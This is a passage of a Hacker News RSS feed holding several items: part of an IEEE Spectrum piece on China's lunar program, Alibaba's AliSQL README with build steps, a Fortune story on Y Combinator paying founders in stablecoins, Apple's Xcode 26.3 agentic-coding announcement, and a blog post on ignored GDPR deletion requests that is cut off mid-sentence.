href="https://spectrum.ieee.org/tag/shenzhou">Shenzhou</a> 1 in 1999, led to the first flight by an astronaut, <a href="https://news.cgtn.com/news/2025-04-25/Yang-Liwei-China-s-first-man-in-space-1CRp6L9OiR2/p.html" rel="noopener noreferrer" target="_blank">Yang Lewei</a>, on Shenzhou 5 in 2003. That led to <a href="https://spectrum.ieee.org/tag/space-stations">space stations</a> (the Tiangong series, starting in 2011), to which Shenzhou crews have been flying since in regular rotation (<a href="https://english.news.cn/20251125/33b434deeca34129a221eb1d158ac9b8/c.html" rel="noopener noreferrer" target="_blank">Shenzhou 22</a> launched in November). Mengzhou will eventually take over as the workhorse crew vehicle for Earth-orbiting flights.</p><p>In the meantime, there has been a steady cadence of robotic lunar orbiters and landers (<a href="https://www.cnsa.gov.cn/english/n6465652/n6465653/c10573102/content.html" rel="noopener noreferrer" target="_blank">Chang’e-6</a> returned the first-ever soil sample from the moon’s far side in 2024), soon to be followed, we’re now told, by Chinese astronauts.</p><p>They started slowly, deliberately, with long breaks between missions, only recently picking up speed. At times they have unabashedly looked to other countries for guidance: The Shenzhou crew capsule in the 1990s <a href="https://spectrum.ieee.org/taikonauts-prepare-for-liftoff" target="_self">borrowed heavily from the design of the Russian Soyuz</a>. And several engineers today point out that the Mengzhou-Lanyue plan sounds in many ways like what then-administrator Michael Griffin proposed for <a href="https://www.academia.edu/36857670/NASA_Constellation_Missions_Program_Full_" rel="noopener noreferrer" target="_blank">NASA’s Constellation program</a> back in 2005—a crewed ship launched by one rocket, a moon lander by another, with astronauts transferring to the lander once they reach lunar orbit. A crew capsule and <a href="https://spectrum.ieee.org/tag/lunar-lander">lunar lander</a> would be too much for one launch, as with the Apollo–Saturn V, because landings would be more ambitious than could be achieved with Apollo’s minimalist lunar module, with longer stays and equipment for a <a href="https://spectrum.ieee.org/tag/lunar-base">lunar base</a>.</p><p>“The Chinese are pursuing an architecture a lot like the Apollo architecture was. Which is understandable because their ambitions are to go fast, and Apollo worked,” says a former senior NASA manager who, like several others, asked not to be quoted by name.</p><p>“I have a lot of friends who have been watching the Chinese space program for the last couple of decades,” this person continued. “And the one hallmark that we can say is that when China announces dates for things, they typically maintain them.”</p><h2>“Our Great Rival”</h2><p>And that is why Jared Isaacman talks of urgency at NASA. He has so far generally avoided the word “China” in public. The Chinese, in his words, are usually “our great rival” or “a competitor.” Some NASA <a href="https://spectrum.ieee.org/tag/veterans">veterans</a> say China may turn out to be giving the agency a helpful push to be faster and more agile. They say Apollo succeeded, in large part, because of the race to beat the <a href="https://spectrum.ieee.org/tag/soviet-union">Soviet Union</a>. A Chinese challenge—even unstated, even illusory—may help Artemis move along.</p><p>“We have a great competitor that is moving at absolutely impressive speeds,” Isaacman <a href="https://www.youtube.com/watch?v=WdQiPJ6KmRc" rel="noopener noreferrer" target="_blank">told</a> NASA employees, “and it’s unsettling to consider the implications if we fail to maintain our technological, scientific, or economic edge in space. And the clock is running.” </p><p><span><em>This is part 2 of a three-part series, Back to the Moon</em></span><em><em>. <a href="https://spectrum.ieee.org/artemis-ii-launch-nasa-orion" target="_blank">Part 1</a> is about the technology behind NASA’s Artemis II mission. Part 3 will look at how NASA reinvigorated its <a href="https://spectrum.ieee.org/tag/human-spaceflight">human spaceflight</a> program.</em></em></p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[AliSQL: Alibaba's open-source MySQL with vector and DuckDB engines (216 pts)]]></title>
            <link>https://github.com/alibaba/AliSQL</link>
            <guid>46875228</guid>
            <pubDate>Tue, 03 Feb 2026 18:40:18 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/alibaba/AliSQL">https://github.com/alibaba/AliSQL</a>, See on <a href="https://news.ycombinator.com/item?id=46875228">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><p dir="auto"><h2 tabindex="-1" dir="auto">AliSQL</h2><a id="user-content-alisql" aria-label="Permalink: AliSQL" href="#alisql"></a></p>
<p dir="auto">AliSQL is Alibaba's MySQL branch, forked from official MySQL and used extensively in Alibaba Group's production environment. It includes various performance optimizations, stability improvements, and features tailored for large-scale applications.</p>
<ul dir="auto">
<li><a href="#alisql">AliSQL</a>
<ul dir="auto">
<li><a href="#-quick-start-duckdb">🚀 Quick Start (DuckDB)</a></li>
<li><a href="#version-information">Version Information</a></li>
<li><a href="#features">Features</a></li>
<li><a href="#roadmap">Roadmap</a></li>
<li><a href="#getting-started">Getting Started</a></li>
<li><a href="#support">Support</a></li>
<li><a href="#contributing">Contributing</a></li>
<li><a href="#license">License</a></li>
<li><a href="#see-also">See Also</a></li>
</ul>
</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">🚀 Quick Start (DuckDB)</h2><a id="user-content--quick-start-duckdb" aria-label="Permalink: 🚀 Quick Start (DuckDB)" href="#-quick-start-duckdb"></a></p>
<blockquote>
<p dir="auto"><strong>Quickly build your DuckDB node:</strong> <strong><a href="https://github.com/alibaba/AliSQL/blob/master/wiki/duckdb/how-to-setup-duckdb-node-en.md">How to set up a DuckDB node</a></strong></p>
</blockquote>
<p dir="auto"><h2 tabindex="-1" dir="auto">Version Information</h2><a id="user-content-version-information" aria-label="Permalink: Version Information" href="#version-information"></a></p>
<ul dir="auto">
<li><strong>AliSQL Version</strong>: 8.0.44 (LTS)</li>
<li><strong>Based on</strong>: MySQL 8.0.44</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Features</h2><a id="user-content-features" aria-label="Permalink: Features" href="#features"></a></p>
<ul dir="auto">
<li>
<p dir="auto"><strong><a href="https://github.com/alibaba/AliSQL/blob/master/wiki/duckdb/duckdb-en.md">DuckDB Storage Engine</a></strong>:AliSQL integrates DuckDB as a native storage engine, allowing users to operate DuckDB with the same experience as MySQL. By leveraging AliSQL for rapid deployment of DuckDB service nodes, users can easily achieve lightweight analytical capabilities.</p>
</li>
<li>
<p dir="auto"><strong><a href="https://github.com/alibaba/AliSQL/blob/master/wiki/vidx/vidx_readme.md">Vector Storage</a></strong>:AliSQL natively supports enterprise-grade vector processing for up to 16,383 dimensions. By integrating a highly optimized HNSW algorithm for high-performance Approximate Nearest Neighbor (ANN) search, AliSQL empowers users to build AI-driven applications—such as semantic search and recommendation systems—seamlessly using standard SQL interfaces.</p>
</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Roadmap</h2><a id="user-content-roadmap" aria-label="Permalink: Roadmap" href="#roadmap"></a></p>
<ul dir="auto">
<li>
<p dir="auto"><strong><a href="https://www.alibabacloud.com/help/en/rds/apsaradb-rds-for-mysql/alisql-ddl-best-practices?spm=a2c63.p38356.help-menu-26090.d_2_8_0.1f7a28a5F1ZVeK" rel="nofollow">DDL Optimization</a></strong> <em>(planned)</em>:AliSQL delivers a faster, safer, and lighter DDL experience through innovations such as enhanced Instant DDL, parallel B+tree construction, a non-blocking lock mechanism, and real-time DDL apply—significantly improving schema change efficiency and virtually eliminating replication lag.</p>
</li>
<li>
<p dir="auto"><strong><a href="https://www.alibabacloud.com/help/en/rds/apsaradb-rds-for-mysql/best-practices-for-rto-optimization-in-alisql?spm=a3c0i.36496430.J_TlTAa0s_LXHOq4tuiO-gv.1.43c56e9bd5YdDQ&amp;scm=20140722.S_help@@%E6%96%87%E6%A1%A3@@2880006._.ID_help@@%E6%96%87%E6%A1%A3@@2880006-RL_RDSMySQLRTO-LOC_2024SPAllResult-OR_ser-PAR1_0bc3b4af17685488697221621e29f2-V_4-PAR3_r-RE_new5-P0_0-P1_0" rel="nofollow">RTO Optimization</a></strong> <em>(planned)</em>:AliSQL deeply optimizes the end-to-end crash recovery path to accelerate instance startup, shorten RTO, and restore service quickly.</p>
</li>
<li>
<p dir="auto"><strong><a href="https://www.alibabacloud.com/help/en/rds/apsaradb-rds-for-mysql/replication-optimization/?spm=a2c63.p38356.help-menu-26090.d_2_6.48a125033Ze9gw" rel="nofollow">Replication Optimization</a></strong> <em>(planned)</em>: AliSQL significantly boosts replication throughput and minimizes lag by implementing Binlog Parallel Flush, Binlog in Redo, and specialized optimizations for large transactions and DDL operations.</p>
</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Getting Started</h2><a id="user-content-getting-started" aria-label="Permalink: Getting Started" href="#getting-started"></a></p>
<p dir="auto"><strong>Prerequisites</strong>:</p>
<ul dir="auto">
<li><a href="https://cmake.org/" rel="nofollow">CMake</a> 3.x or higher</li>
<li>Python3</li>
<li>C++17 compliant compiler (GCC 7+ or Clang 5+)</li>
</ul>
<p dir="auto"><strong>Build Instructions</strong>:</p>
<div dir="auto" data-snippet-clipboard-copy-content="# Clone the repository
git clone https://github.com/alibaba/AliSQL.git
cd AliSQL

# Build the project (release build)
sh build.sh -t release -d /path/to/install/dir

# For development/debugging (debug build)
sh build.sh -t debug -d /path/to/install/dir

# Install the built MySQL server
make install"><pre><span><span>#</span> Clone the repository</span>
git clone https://github.com/alibaba/AliSQL.git
<span>cd</span> AliSQL

<span><span>#</span> Build the project (release build)</span>
sh build.sh -t release -d /path/to/install/dir

<span><span>#</span> For development/debugging (debug build)</span>
sh build.sh -t debug -d /path/to/install/dir

<span><span>#</span> Install the built MySQL server</span>
make install</pre></div>
<p dir="auto"><strong>Build Options</strong>:</p>
<ul dir="auto">
<li><code>-t release|debug</code>: Build type (default: debug)</li>
<li><code>-d &lt;dest_dir&gt;</code>: Installation directory (default: /usr/local/alisql or $HOME/alisql)</li>
<li><code>-s &lt;server_suffix&gt;</code>: Server suffix (default: alisql-dev)</li>
<li><code>-g asan|tsan</code>: Enable sanitizer</li>
<li><code>-c</code>: Enable GCC coverage (gcov)</li>
<li><code>-h, --help</code>: Show help</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Support</h2><a id="user-content-support" aria-label="Permalink: Support" href="#support"></a></p>
<ul dir="auto">
<li><strong>GitHub Issues</strong>: <a href="https://github.com/alibaba/AliSQL/issues">https://github.com/alibaba/AliSQL/issues</a></li>
<li><strong>Alibaba Cloud RDS</strong>: <a href="https://help.aliyun.com/zh/rds/apsaradb-rds-for-mysql/duckdb-based-analytical-instance/" rel="nofollow">DuckDB-based Analytical Instance</a></li>
</ul>
<blockquote>
<p dir="auto">For DuckDB-specific support, see the <a href="https://duckdblabs.com/support/" rel="nofollow">DuckDB Support Options</a>.</p>
</blockquote>
<p dir="auto"><h2 tabindex="-1" dir="auto">Contributing</h2><a id="user-content-contributing" aria-label="Permalink: Contributing" href="#contributing"></a></p>
<p dir="auto">AliSQL 8.0 became an open-source project in December 2025 and is actively maintained by engineers at Alibaba Group.</p>
<p dir="auto">Contributions are welcome! Please:</p>
<ol dir="auto">
<li>Fork the repository</li>
<li>Create a feature branch</li>
<li>Make your changes with appropriate tests</li>
<li>Submit a pull request</li>
</ol>
<p dir="auto">For bug reports and feature requests, please use the <a href="https://github.com/alibaba/AliSQL/issues">GitHub Issues</a> page.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">License</h2><a id="user-content-license" aria-label="Permalink: License" href="#license"></a></p>
<p dir="auto">This project is licensed under the GPL-2.0 license. See the <a href="https://github.com/alibaba/AliSQL/blob/master/LICENSE">LICENSE</a> file for details.</p>
<p dir="auto">AliSQL is based on MySQL, which is licensed under GPL-2.0. The DuckDB integration follows the same licensing terms.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">See Also</h2><a id="user-content-see-also" aria-label="Permalink: See Also" href="#see-also"></a></p>
<ul dir="auto">
<li><a href="https://github.com/alibaba/AliSQL/blob/master/wiki/changes-in-alisql-8.0.44.md">AliSQL Release Notes</a></li>
<li><a href="https://github.com/alibaba/AliSQL/blob/master/wiki/duckdb/duckdb-en.md">DuckDB Storage Engine in AliSQL</a></li>
<li><a href="https://github.com/alibaba/AliSQL/blob/master/wiki/vidx/vidx_readme.md">Vector Index in AliSQL</a></li>
<li><a href="https://dev.mysql.com/doc/refman/8.0/en/" rel="nofollow">MySQL 8.0 Documentation</a></li>
<li><a href="https://github.com/mysql/mysql-server">MySQL 8.0 Github Repository</a></li>
<li><a href="https://duckdb.org/docs/stable/" rel="nofollow">DuckDB Official Documentation</a></li>
<li><a href="https://github.com/duckdb/duckdb">DuckDB GitHub Repository</a></li>
<li><a href="https://mp.weixin.qq.com/s/_YmlV3vPc9CksumXvXWBEw" rel="nofollow">Detailed Article (Chinese)</a></li>
</ul>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Y Combinator will let founders receive funds in stablecoins (126 pts)]]></title>
            <link>https://fortune.com/2026/02/03/famed-startup-incubator-y-combinator-to-let-founders-receive-funds-in-stablecoins/</link>
            <guid>46875033</guid>
            <pubDate>Tue, 03 Feb 2026 18:28:48 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://fortune.com/2026/02/03/famed-startup-incubator-y-combinator-to-let-founders-receive-funds-in-stablecoins/">https://fortune.com/2026/02/03/famed-startup-incubator-y-combinator-to-let-founders-receive-funds-in-stablecoins/</a>, See on <a href="https://news.ycombinator.com/item?id=46875033">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><article data-cy="article-content"><p>In the latest sign of digital currencies going mainstream, Silicon Valley’s most prominent startup incubator will allow its spring cohort of entrepreneurs to receive their funding in stablecoins. Y Combinator, whose alumni include the founders of <a aria-label="Go to https://fortune.com/company/airbnb/" target="_blank" href="https://fortune.com/company/airbnb/">Airbnb</a> and <a aria-label="Go to https://fortune.com/company/doordash/" target="_blank" href="https://fortune.com/company/doordash/">DoorDash</a>, announced on Tuesday that founders can opt to receive their customary allotment—typically around $500,000—in the Circle-issued USDC.&nbsp;</p><div>



<p>Startup founders who choose stablecoins can choose to receive the tokens on various blockchains such as Ethereum and Solana, Nemil Dalal, a visiting partner at Y Combinator who focuses on crypto, told <em>Fortune</em>. He added that Y Combinator may expand to other stablecoins depending on demand.</p>



<p>“Stablecoins is one of the key pillars for us,” Dalal said, referring to one of the areas where Y Combinator would like to see more startup ideas. “So we just want to live and breathe that as well.”</p>



<h2>Price agnostic</h2>



<p>While many crypto venture capitalists have let the startups in their portfolio take funding from stablecoins for some time, more traditional tech investors haven’t given that opportunity to founders. Dalal, for example, said he wasn’t aware of any legacy VCs who offer that option. “We’re excited for a world where, in the future, we think a lot of startups will eventually start raising capital on-chain,” he said.&nbsp;</p>



<p>Stablecoins have been around for more than a decade, but historically, their adoption was primarily limited to crypto traders seeking a non-volatile asset in which to park profits. In the past two years, however, stablecoins have burst into the <a aria-label="Go to https://fortune.com/2026/01/17/stablecoins-could-fix-a-broken-international-payments-system/" href="https://fortune.com/2026/01/17/stablecoins-could-fix-a-broken-international-payments-system/">headlines</a> following a push by Wall Street and corporations that view the assets as a faster and more inexpensive way to move money around.</p>



<p>Big Tech has taken notice, especially after President Donald Trump <a aria-label="Go to https://fortune.com/crypto/2025/07/18/trump-crypto-legislation-genius-act-stablecoin-conflict-of-intere/" href="https://fortune.com/crypto/2025/07/18/trump-crypto-legislation-genius-act-stablecoin-conflict-of-intere/">signed into law</a> in July a bill regulating the crypto assets. The fintech giant <a aria-label="Go to https://fortune.com/company/stripe/" target="_blank" href="https://fortune.com/company/stripe/">Stripe</a> <a aria-label="Go to https://www.cnbc.com/2025/02/04/stripe-closes-1point1-billion-bridge-deal-prepares-for-stablecoin-push-.html" href="https://www.cnbc.com/2025/02/04/stripe-closes-1point1-billion-bridge-deal-prepares-for-stablecoin-push-.html">completed</a> a $1.1 billion acquisition of stablecoin startup Bridge in February 2025 and has since <a aria-label="Go to https://fortune.com/crypto/2025/10/17/stripe-paradigm-tempo-series-a-5-billion-thrive-capital-greenoaks-joshua-kushner/" href="https://fortune.com/crypto/2025/10/17/stripe-paradigm-tempo-series-a-5-billion-thrive-capital-greenoaks-joshua-kushner/">backed</a> its own blockchain designed for stablecoin transactions. The cloud infrastructure company <a aria-label="Go to https://fortune.com/company/cloudfare/" target="_blank" href="https://fortune.com/company/cloudfare/">Cloudflare</a> <a aria-label="Go to https://www.cloudflare.com/press/press-releases/2025/cloudflare-introduces-net-dollar-to-support-a-new-business-model-for-the-ai-driven-internet/" href="https://www.cloudflare.com/press/press-releases/2025/cloudflare-introduces-net-dollar-to-support-a-new-business-model-for-the-ai-driven-internet/">announced</a> its intention to launch its own stablecoin in September. And the buy-now, pay-later firm Klarna <a aria-label="Go to https://www.klarna.com/international/press/klarna-launches-klarnausd-as-stablecoin-transactions-hit-usd27-trillion/" href="https://www.klarna.com/international/press/klarna-launches-klarnausd-as-stablecoin-transactions-hit-usd27-trillion/">launched</a> its own token as well in November.&nbsp;&nbsp;</p>



<p>Those announcements largely came during a more bullish crypto market that saw Bitcoin and other tokens notch all-time highs. Now, sentiment has soured as the world’s largest cryptocurrency nears monthslong lows. But, Dalal, the visiting partner at Y Combinator, said that bearish outlook doesn’t apply to stablecoins. “The excitement on stablecoins is just growing,” he said. “It’s actually agnostic of prices.”</p>
</div><div><p><span><strong>Join us at the Fortune Workplace Innovation Summit </strong>May 19–20, 2026, in Atlanta. The next era of workplace innovation is here—and the old playbook is being rewritten. At this exclusive, high-energy event, the world’s most innovative leaders will convene to explore how AI, humanity, and strategy converge to redefine, again, the future of work. <a href="https://conferences.fortune.com/event/workplace-innovation-2026/HOME">Register now</a>.</span></p></div></article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Xcode 26.3 unlocks the power of agentic coding (315 pts)]]></title>
            <link>https://www.apple.com/newsroom/2026/02/xcode-26-point-3-unlocks-the-power-of-agentic-coding/</link>
            <guid>46874619</guid>
            <pubDate>Tue, 03 Feb 2026 18:04:08 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.apple.com/newsroom/2026/02/xcode-26-point-3-unlocks-the-power-of-agentic-coding/">https://www.apple.com/newsroom/2026/02/xcode-26-point-3-unlocks-the-power-of-agentic-coding/</a>, See on <a href="https://news.ycombinator.com/item?id=46874619">Hacker News</a></p>
<div id="readability-page-1" class="page">


	
    







 
<nav id="ac-localnav" lang="en-US" role="navigation" aria-label="Newsroom" data-analytics-region="local nav" data-sticky="">
	
    
    
        




    
    
    
	
	

</nav>





<main id="main" role="main"> 




<span id="opens-in-new-window">opens in new window</span>
<section>
<article data-analytics-activitymap-region-id="article">






    
    
    









    





    <div>
        
		
        

        <div>
                
                
                
                    <h2>
                        
    
        Xcode 26.3 unlocks the power of agentic coding
    

                    </h2>
                
            </div>

        <div>
                
                
                    Developers can leverage coding agents, including Anthropic’s Claude Agent and OpenAI’s Codex, directly in Xcode to tackle complex tasks autonomously, helping them develop apps faster than ever
                
            </div>

        
            
    
    
    
    
    

        

    </div>







    
    
    






  
    
    
    
    
      <figure aria-label="Media, A MacBook Pro desktop shows the Xcode app with new agentic coding capabilities.">
        <div>
             
              
              <div>
                Xcode 26.3 unlocks agentic coding, allowing developers to harness agents like Anthropic’s Claude Agent and OpenAI’s Codex directly in Xcode.
              </div>
            
            
            
            
            <a href="https://www.apple.com/newsroom/images/2026/02/xcode-26-point-3-unlocks-the-power-of-agentic-coding/article/Apple-Xcode-agentic-coding-hero.zip" download="" data-analytics-title="download image - Apple-Xcode-agentic-coding-hero_big" aria-label="Download media, A MacBook Pro desktop shows the Xcode app with new agentic coding capabilities."></a>
          </div>
      </figure>
    
  








    
    
    


     
     
    
    
        <div>
             
                 <div>Xcode 26.3 introduces support for agentic coding, a new way in Xcode for developers to build apps using coding agents such as Anthropic’s Claude Agent and OpenAI’s Codex. With agentic coding, Xcode can work with greater autonomy toward a developer’s goals — from breaking down tasks to making decisions based on the project architecture and using built-in tools.
</div>
                 
             
                 <div>Expanding on the intelligence features introduced in Xcode 26, which brought a brand-new coding assistant for writing and editing in Swift, this release gives coding agents access to even more of Xcode’s capabilities. Agents like Claude Agent and Codex can now collaborate throughout the entire development life cycle, giving developers the power to streamline workflows, iterate faster, and bring ideas to life like never before. Agents can search documentation, explore file structures, update project settings, and verify their work visually by capturing Xcode Previews and iterating through builds and fixes.
</div>
                 
             
                 <div>“At Apple, our goal is to make tools that put industry-leading technologies directly in developers’ hands so they can build the very best apps,” said Susan Prescott, Apple’s vice president of Worldwide Developer Relations. “Agentic coding supercharges productivity and creativity, streamlining the development workflow so developers can focus on innovation.”
</div>
                 
             
         </div>
 

    
    
    


    
    
        
        
        
            <div role="group" aria-label="gallery" data-component-list="MixinGallery" id="agentic-coding-xcode">
            <nav role="presentation">
                <ul role="tablist">
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-f54f2b2d489a1e03e9e1f58421bd55e0" href="#gallery-f54f2b2d489a1e03e9e1f58421bd55e0" data-ac-gallery-trigger="gallery-f54f2b2d489a1e03e9e1f58421bd55e0"><span>In Xcode, a developer uses agentic coding for an iPhone app showing a detailed view of Mount Fuji.</span></a>
                        </li>
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-f1c57acfbe17cfd81f24869a683111d3" href="#gallery-f1c57acfbe17cfd81f24869a683111d3" data-ac-gallery-trigger="gallery-f1c57acfbe17cfd81f24869a683111d3"><span>In Xcode, a developer uses agentic coding for an iPhone app showing a detailed view of Yellowstone National Park.</span></a>
                        </li>
                    
                </ul>
            </nav>
            <div>
                
                    
                        
                        <div id="gallery-f54f2b2d489a1e03e9e1f58421bd55e0" aria-labelledby="gallery-dotnav-f54f2b2d489a1e03e9e1f58421bd55e0" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:mount-fuji">
                                
                                <div>
                                    <div>With seamless access to Anthropic’s Claude Agent (pictured) and OpenAI’s Codex, developers can bring the advanced reasoning of powerful models directly into their app-building workflow.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2026/02/xcode-26-point-3-unlocks-the-power-of-agentic-coding/article/Apple-Xcode-agentic-coding-with-Anthropic-Claude-Agent.zip" download="" data-analytics-title="download image - Apple-Xcode-agentic-coding-with-Anthropic-Claude-Agent_big" aria-label="Download media, In Xcode, a developer uses agentic coding for an iPhone app showing a detailed view of Mount Fuji."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
                    
                        
                        <div id="gallery-f1c57acfbe17cfd81f24869a683111d3" aria-labelledby="gallery-dotnav-f1c57acfbe17cfd81f24869a683111d3" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:yellowstone-national-park">
                                
                                <div>
                                    <div>With seamless access to Anthropic’s Claude Agent and OpenAI’s Codex (pictured), developers can bring the advanced reasoning of powerful models directly into their app-building workflow.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2026/02/xcode-26-point-3-unlocks-the-power-of-agentic-coding/article/Apple-Xcode-agentic-coding-with-OpenAI-Codex.zip" download="" data-analytics-title="download image - Apple-Xcode-agentic-coding-with-OpenAI-Codex_big" aria-label="Download media, In Xcode, a developer uses agentic coding for an iPhone app showing a detailed view of Yellowstone National Park."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
            </div>
            
                
                
                <nav role="presentation">
                    
                        <ul>
                            <li>
                                
                            </li>
                            <li>
                                
                            </li>
                        </ul>
                    
                </nav>
            
        </div>
    


    
    
    


     
     
    
    
        <div>
             
                 <div>With seamless access to Claude Agent and Codex, developers can bring the advanced reasoning of these models directly into their app-building workflow.<sup>1</sup> This connection combines the power of these agents with Xcode’s native capabilities to provide the best results when developing for Apple platforms, giving developers the flexibility to work with the model that best fits their project.
</div>
                 
             
                 <div>In addition to these built-in integrations, Xcode 26.3 makes its capabilities available through the Model Context Protocol, an open standard that gives developers the flexibility to use any compatible agent or tool with Xcode.
</div>
                 
             
         </div>
 

    
    
    


     
     
    
    
        <div>Xcode 26.3 is available as a release candidate for all members of the Apple Developer Program starting today, with a release coming soon on the App Store.
</div>
 

    
    
    




    
    
        
    


    
    
    



    
    
    





    
    
    <div>
            <ol>
<li>Anthropic and OpenAI’s terms of service may apply.</li>
</ol>

        </div>



    
    
    






    















	

		
		
			
























		
		

</article>



</section>
</main>



<div>
            Stay up to date with the latest articles from Apple Newsroom.
        </div>
	

</div>]]></description>
        </item>
        <item>
            <title><![CDATA[I made 20 GDPR deletion requests. 12 were ignored (135 pts)]]></title>
            <link>https://nikolak.com/gdpr-failure/</link>
            <guid>46874345</guid>
            <pubDate>Tue, 03 Feb 2026 17:48:22 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://nikolak.com/gdpr-failure/">https://nikolak.com/gdpr-failure/</a>, See on <a href="https://news.ycombinator.com/item?id=46874345">Hacker News</a></p>
<div id="readability-page-1" class="page"><section>
        <p>GDPR is one of the things that both EU citizens like to brag about, and companies like to advertise with. But as someone who does make extensive use of it, the entire process is flawed, the laws are ignored, and enforcement is borderline impossible. It's the data protection equivalent of the cookie popups, which I'd even argue are more effective in their goal.</p><p>Whenever a company has my data and uses it for marketing purposes without an easy opt out, or a company has my data and I stop using their services, I generally like to have the data deleted or to withdraw certain consent like for marketing purposes. Sometimes this is easy, but sometimes it requires invoking my GDPR rights as a EU citizen to actually get done.</p><p>In the past year I have made around 20 GDPR data deletion/information requests to various companies. Only 2 have complied immediately, further 6 have complied after filing a complaint with the data protection office, the remaining 12 have not complied. Large companies, charities, companies that advertise explicitly with "Made in EU/GDPR Compliant". From Greenpeace, government funded museums, to open source companies, completely fail at this.</p><div><p>💡</p><p>I am aware that some data, such as invoices, or other data may be kept for longer period due to various financial laws. Whenever I speak of "data" in this article I'm referring to things like profile pictures, phone number(s), emails, stored addresses, online accounts viewable by others, and so on.</p></div><p>Let's look at how one of the bigger companies in 3D Printing world, that often gets mentioned for their privacy and the fact that they're from EU and GDPR compliant, Prusa 3D, handles a simple request to delete user data:</p><ol><li>Step one, change the user's email</li></ol><figure><img src="https://nikolak.com/content/images/2026/02/image.png" alt="" loading="lazy" width="1698" height="792" srcset="https://nikolak.com/content/images/size/w600/2026/02/image.png 600w, https://nikolak.com/content/images/size/w1000/2026/02/image.png 1000w, https://nikolak.com/content/images/size/w1600/2026/02/image.png 1600w, https://nikolak.com/content/images/2026/02/image.png 1698w" sizes="(min-width: 720px) 720px"></figure><ol start="2"><li>Step two, say that you deleted the data:</li></ol><figure><img src="https://nikolak.com/content/images/2026/02/image-1.png" alt="" loading="lazy" width="1674" height="708" srcset="https://nikolak.com/content/images/size/w600/2026/02/image-1.png 600w, https://nikolak.com/content/images/size/w1000/2026/02/image-1.png 1000w, https://nikolak.com/content/images/size/w1600/2026/02/image-1.png 1600w, https://nikolak.com/content/images/2026/02/image-1.png 1674w" sizes="(min-width: 720px) 720px"></figure><p>To this day, I still can view and verify that they have in fact not deleted my data. I even added a "GDPR Failed" address to my account after the email, so they're not even blocking it in some way.</p><p>The email says "request from 28 November 2025", the truth is that I sent a GDPR deletion request in 2024, and this was just a reminder that they still haven't processed it. This is also after the "GDPR Advisor" saying that requesting data deletion via email isn't even legally allowed, which is completely wrong.</p><h2 id="regulatory-hell">Regulatory hell</h2><p>Taking the example from above, you'd think that a company blatantly ignoring a deletion request would be straightforward to report. Company has data, company was asked to delete it, company didn't. Open and shut.</p><p>I reported Prusa to the Czech data protection office back in 2024 (case UOOUX00H3395). As of writing, they have never processed my request. They never replied to my follow-ups, written in both Czech and English. Nothing happened.</p><p>The German data protection office was more responsive - they replied after about a month, telling me there's nothing they can do. Their only option would be to contact their Czech counterparts, and since I already did that, the chain ends there. So despite being a German citizen, my data protection rights depend entirely on the enforcement capacity and willingness of a foreign regulatory body.</p><p>This is the reality for any cross-border GDPR complaint. The regulation is EU-wide, but enforcement is national. If the company sits in a country where the data protection office is underfunded, understaffed, or simply doesn't care, you're out of luck. Your only remaining option is to hire a lawyer, pay out of pocket, and sue a company in another country for something they should have done after a single email.</p><p>Of the 12 companies that still haven't complied with my requests, the pattern is the same. The data protection office either didn't respond, didn't act, or the company simply ignored the office too. The data is still there. The accounts are still active. Nothing changed.</p><h2 id="the-spam-filter-loophole">The spam filter loophole</h2><p>For the 6 companies that did comply after I involved the data protection offices, most gave the same excuse: they never received the request.</p><p>A few went further. They claimed their IT systems automatically categorized my GDPR request as spam and deleted it before anyone saw it. And the data protection agencies accepted this.</p><p>Here's the exact legal reasoning I was given when I reported the Naturhistorisches Museum Wien - a government-funded museum, translated:</p><blockquote>According to Art. 12 (3) GDPR, the deadline for processing a request to exercise data subject rights only begins upon actual receipt by the controller. An email that is automatically processed by upstream IT security systems (e.g., spam or malware filters) and does not reach the responsible organizational units is legally not considered as received. The GDPR does not establish an obligation to manually review all automatically filtered messages.</blockquote><p>Read that again. A company can list an email address as their official GDPR contact in their privacy policy, and if their own spam filter eats your request, it legally never happened. There is no obligation to check. There is no obligation to ensure delivery. The burden is entirely on you to prove they received it.</p><p>This isn't an edge case. This is a systemic loophole that allows any company to quietly discard data protection requests with zero consequences. Set up aggressive spam filtering on your GDPR inbox, and you've effectively opted out of the regulation.</p><p>And if you do follow up, the clock resets. The 30-day response window from Art. 12 (3) starts from "actual receipt," which means the company can play this game indefinitely.</p><h2 id="changes-are-needed">Changes are needed</h2><p>GDPR in its essence is not bad. The rights it grants are reasonable and necessary. But the enforcement infrastructure around it is broken, and without serious changes, it will remain a regulation that only those who already care about privacy comply with.</p><p><strong>Cross-border enforcement needs to actually work.</strong> If I'm a German citizen and a Czech company violates my rights, there needs to be a mechanism that doesn't dead-end at "we forwarded it to the Czech office, good luck." The EU needs to either centralize cross-border complaints or give national offices the authority to enforce against companies in other member states directly.</p><p><strong>The spam filter loophole needs to die.</strong> Companies should be required to implement a standardized, verifiable request method. A web form, a dedicated portal, something that generates a confirmation and a timestamp. If a company lists only an email address for GDPR requests, they should be liable for delivery failures on their end. You can't advertise an email as the official channel and then claim your own infrastructure made it unreachable.</p><p><strong>There need to be mandatory minimum fines.</strong> Not the theoretical 4% of global revenue that only ever hits trillion-dollar companies. A flat minimum, say 5,000€ per violation, no matter how small 